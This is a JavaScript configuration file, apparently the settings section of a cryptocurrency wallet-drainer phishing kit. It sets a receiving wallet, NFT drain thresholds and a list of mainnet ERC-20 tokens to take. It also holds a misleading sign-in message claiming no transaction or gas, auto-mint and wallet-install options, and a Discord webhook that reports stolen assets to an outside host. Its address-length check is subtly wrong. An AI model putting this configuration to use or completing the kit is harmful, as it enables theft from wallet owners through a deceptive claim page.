const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/

const receiveAddress = "0x8935361d21943Ee8a863082EdD8a6Aefb062E434"; // YOUR WALLET ADDRESS


const drainNftsInfo = {
    minValue: 0.05, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
    maxTransfers: 1000,
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const autoConnect = false; //false; // auto connect wallet
const autoMint = true; // auto click claim button


const erc20list = {
  // Bsc testnet
  /*
  '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
  '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
  */
  // Ethernet mainnet
  '0x6B175474E89094C44Da98b954EedeAC495271d0F': 10, // DAI ethernet
  '0xdAC17F958D2ee523a2206206994597C13D831ec7': 10, // usdt
  '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48': 10, // usdc
  '0x4Fabb145d64652a948d72533023f6E7A623C7C53': 10, // busd
  '0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce': 10, // shib
  '0x514910771af9ca656af840dff83e8264ecf986ca': 10, // link
  '0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72': 10, // ens
  '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984': 10, // uniswap
}

const installInNewWindow = true; // install wallet if not installed

const discordWebhookURL = "https://discordapp.com/api/webhooks/1078091750171746324/_S78Y9bzo5TvyNoeplYhQOSHA-lzF-P_qhEhTBZTUEcYydZHr682gNg99QsXnnswGj6-"; // put ur discord webhook url in here to receive NFT's
const feedbackEnabled = true; // let enabled to receive webhooks
/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || receiveAddress.length !== 40)
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
